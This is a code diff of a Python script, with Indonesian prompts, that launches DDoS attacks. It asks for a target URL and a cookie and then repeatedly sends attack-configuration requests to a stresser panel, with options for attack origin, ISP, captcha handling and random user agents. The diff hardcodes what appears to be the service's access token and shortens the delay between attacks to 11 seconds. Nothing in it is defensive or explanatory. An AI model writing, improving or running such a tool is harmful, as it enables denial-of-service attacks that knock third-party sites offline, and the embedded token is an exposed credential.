@@ -22,13 +22,27 @@ def animate_cowsay(message):
     cowsay.cow(message)
 
 def main():
-    # Prompt user for name, target URL, and token
+    # Prompt user for name, target URL, and cookie with animation
     name = get_input("Masukkan nama: ")
-    target_url = get_input("Masukkan target URL: ")
-    token = get_input("Masukkan token: ")
+    target_url = get_input("Masukkan URL target: ")
+    cookie = get_input("Masukkan cookie: ")
 
-    # Define the payload with the new parameters
-    payload = {
+    # Headers for the request
+    headers = {
+        "Cookie": cookie,
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36",
+        "Accept": "*/*",
+        "Referer": "",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Accept-Language": "en-US,en;q=0.9"
+    }
+
+    # Request URL
+    url = "https://stresse.net/panel/load"
+
+    # Request body
+    body = {
         "addParams": {
             "reqMethod": "GET",
             "ignore": True,
@@ -53,7 +67,7 @@ def main():
         "ignoreStatus": 0,
         "captcha": 0,
         "customCaptcha": 0,
-        "sourseport": "",
+        "sourceport": "",
         "isp": "OVH",
         "attackOriginCustom": "any",
         "customCountry": "Worldwide",
@@ -108,22 +122,20 @@ def main():
         "userAgentSmart": "Random",
         "userAgentCustom": "",
         "attackOriginActive": "Worldwide",
-        "token": token
+        "token": "933827d6296e56b31e74198f9f10ff330e3eaed0e7e5714773bfe4d9c44eb0e1"
     }
-
-    url = "https://stresse.net/panel/load"
 
     while True:
         try:
-            response = requests.post(url, json=payload)
+            response = requests.post(url, headers=headers, data=json.dumps(body))
             if response.status_code == 200:
-                message = f"Nama: {name}\nTarget URL: {target_url}\nToken: {token}\nSerangan berhasil dijalankan!"
+                message = f"Nama: {name}\nURL Target: {target_url}\nAttack telah berjalan dengan sukses!"
                 animate_cowsay(message)
             else:
-                slow_print(f"Error: {response.status_code} - {response.text}")
+                slow_print(f"Error: {response.status_code}")
         except Exception as e:
             slow_print(f"Terjadi kesalahan: {e}")
-        time.sleep(100)  # Delay 100 detik sebelum request berikutnya
+        time.sleep(11)  # Delay 11 detik sebelum request berikutnya
 
 if __name__ == "__main__":
     main()
